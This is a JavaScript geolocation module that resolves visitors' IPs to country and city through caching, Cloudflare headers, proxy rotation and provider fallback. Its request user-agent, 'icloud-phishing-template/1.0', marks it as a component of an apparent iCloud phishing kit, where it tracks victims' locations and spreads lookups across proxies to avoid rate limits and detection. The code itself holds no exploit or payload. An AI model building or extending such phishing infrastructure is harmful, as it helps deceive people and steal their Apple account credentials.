import { TtlCache } from "./cache.js";
import { ProxyPool } from "./proxy.js";
import { PROVIDERS } from "./providers.js";
import { countryName, isPrivateIp } from "../ip.js";
import { config } from "../config.js";

/* Country / city lookup with three layers of protection against rate limits:
 *
 *   1. a TTL cache keyed by IP               (almost every view is a hit)
 *   2. Cloudflare's cf-ipcountry header       (no provider call at all)
 *   3. proxy rotation + provider fallback      (the actual lookup)
 *
 * `lookup()` always resolves to a normalised object; it never throws, so a
 * broken geo provider can never take the page down. */

export function createGeoResolver(geoConfig = config.geo) {
  const pool = new ProxyPool(geoConfig.proxies, {
    timeoutMs: geoConfig.timeoutMs,
  });
  const cache = new TtlCache({ ttlMs: geoConfig.cacheTtlMs });

  function routes() {
    const list = pool.candidates().map((url) => ({ url, proxied: true }));
    if (geoConfig.allowDirect || list.length === 0) {
      list.push({ url: null, proxied: false });
    }
    return list.slice(0, Math.max(1, geoConfig.maxAttemptsPerProvider));
  }

  async function fetchJson(url, proxyUrl) {
    const response = await fetch(url, {
      signal: AbortSignal.timeout(geoConfig.timeoutMs),
      headers: { accept: "application/json", "user-agent": "icloud-phishing-template/1.0" },
      ...(proxyUrl ? { dispatcher: pool.agentFor(proxyUrl) } : {}),
    });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return response.json();
  }

  async function queryProviders(ip) {
    let lastError = null;
    for (const provider of PROVIDERS) {
      for (const route of routes()) {
        try {
          const json = await fetchJson(provider.url(ip), route.url);
          const data = provider.parse(json);
          if (!data.country && !data.countryCode) throw new Error("empty country");
          return {
            ip,
            ...data,
            source: provider.name,
            proxied: route.proxied,
            cached: false,
          };
        } catch (error) {
          lastError = error;
        }
      }
    }
    throw lastError ?? new Error("no geo provider answered");
  }

  async function lookup(ip, { headerCountry = "" } = {}) {
    if (isPrivateIp(ip)) {
      return {
        ip,
        country: "Local",
        countryCode: "",
        region: "",
        city: "",
        source: "local",
        proxied: false,
        cached: false,
      };
    }

    const hit = cache.get(ip);
    if (hit) return { ...hit, cached: true };

    if (geoConfig.trustCountryHeader && headerCountry) {
      const result = {
        ip,
        country: countryName(headerCountry),
        countryCode: headerCountry,
        region: "",
        city: "",
        source: "header",
        proxied: false,
        cached: false,
      };
      cache.set(ip, result);
      return result;
    }

    try {
      const result = await queryProviders(ip);
      cache.set(ip, result);
      return result;
    } catch {
      const fallback = {
        ip,
        country: "Unknown",
        countryCode: "",
        region: "",
        city: "",
        source: "none",
        proxied: false,
        cached: false,
      };
      // Short negative cache: retry soon, but not on every request.
      cache.set(ip, fallback, geoConfig.negativeCacheTtlMs);
      return fallback;
    }
  }

  return {
    lookup,
    cache,
    close: () => pool.close(),
    get proxyCount() {
      return pool.size;
    },
  };
}

export const geo = createGeoResolver();
